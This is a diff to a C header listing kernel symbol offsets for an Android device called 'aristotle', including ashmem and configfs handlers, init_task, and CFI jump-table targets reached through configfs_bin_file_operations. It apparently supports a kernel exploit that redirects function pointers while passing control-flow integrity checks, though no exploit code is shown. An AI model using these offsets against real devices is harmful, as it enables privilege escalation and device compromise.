@@ -50,8 +50,13 @@
 #define ASHMEM_OPEN_OFF 0x011a45d0ULL         /* ✓ IDA: func entry sub_11EF340 */
 #define ASHMEM_RELEASE_OFF 0x011a4670ULL      /* ✓ IDA: func entry sub_11EF580 */
 #define ASHMEM_SHOW_FDINFO_OFF 0x011a4794ULL  /* ✓ IDA: func entry sub_11EF620 */
-#define CONFIGFS_READ_ITER_OFF 0x006b4794ULL  /* ✓ IDA: func entry sub_6B038C */
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x02157220ULL /* ✓ IDA: func entry sub_6B050C */
+#define CONFIGFS_READ_ITER_OFF 0x006b4794ULL  /* (unused on aristotle: configfs bin files use .read, not read_iter) */
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x02157220ULL /* WRONG for aristotle (this is the configfs_bin_file_operations TABLE); use CONFIGFS_*_BIN below */
+/* aristotle configfs binary files use .read/.write (NOT the _iter variants).
+ * These are the .cfi_jt forms stored in configfs_bin_file_operations@0x2157220
+ * (+0x10 read, +0x18 write) — the CFI-valid targets the kernel dispatches to. */
+#define CONFIGFS_READ_BIN_OFF 0x0182ee20ULL   /* configfs_read_bin_file.cfi_jt */
+#define CONFIGFS_WRITE_BIN_OFF 0x0182f330ULL  /* configfs_write_bin_file.cfi_jt */
 #define COPY_SPLICE_READ_OFF 0x005c18a4ULL    /* ✓ IDA: func entry sub_5E6830 */
 #define NOOP_LLSEEK_OFF 0x0054684cULL         /* ✓ IDA: func entry sub_56CF68 (exact match) */
 #define INIT_TASK_OFF 0x0277bf80ULL          /* ✓ vmlinux-to-elf nm */
@@ -77,6 +82,8 @@
 #define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
 #define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
 #define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define CONFIGFS_READ_BIN (KIMAGE_TEXT_BASE + CONFIGFS_READ_BIN_OFF)
+#define CONFIGFS_WRITE_BIN (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_OFF)
 #define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
 #define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
 #define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
